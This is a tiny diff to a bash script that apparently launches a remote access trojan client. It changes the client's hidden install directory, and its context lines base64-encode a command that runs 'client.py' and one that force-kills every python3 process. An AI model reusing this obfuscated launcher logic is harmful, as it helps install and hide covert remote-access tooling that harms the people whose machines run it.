@@ -1,6 +1,6 @@
 #!/bin/bash
 PWD=$(pwd)
-RATPWD="/home/.balgogan/src"
+RATPWD="/home/.trhacknon/src"
 RUNNER=$(echo "python3 $RATPWD/client.py" | base64) 
 KILLER=$(echo "pkill -9 -f python3" | base64)
 
